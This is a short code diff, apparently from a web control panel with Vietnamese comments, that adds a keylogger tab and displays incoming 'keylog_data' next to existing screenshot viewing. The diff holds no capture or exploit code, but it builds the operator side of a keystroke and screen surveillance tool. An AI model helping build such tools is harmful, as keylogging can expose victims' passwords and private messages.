@@ -194,6 +194,12 @@
                     img.src = "data:image/jpeg;base64," + json.data;
                     log("Đã nhận ảnh chụp màn hình.");
                 }
+                else if (json.type === 'keylog_data') {
+                    const txt = document.getElementById('txtKeylogs');
+                    txt.value = json.data;
+                    txt.scrollTop = txt.scrollHeight; // Tự cuộn xuống dưới
+                    log("Đã tải dữ liệu Keylogger.");
+                }
             } catch (e) {
                 log("Server: " + data);
             }
@@ -229,6 +235,10 @@
         } else if (tab === 'screen') {
             document.getElementById('toolbar-screen').classList.remove('hidden');
             document.getElementById('view-screen').classList.remove('hidden');
+        }
+        else if (tab === 'keylog') {
+            document.getElementById('toolbar-keylog').classList.remove('hidden');
+            document.getElementById('view-keylog').classList.remove('hidden');
         }
         
         // Không auto-refresh tab screen để tiết kiệm băng thông
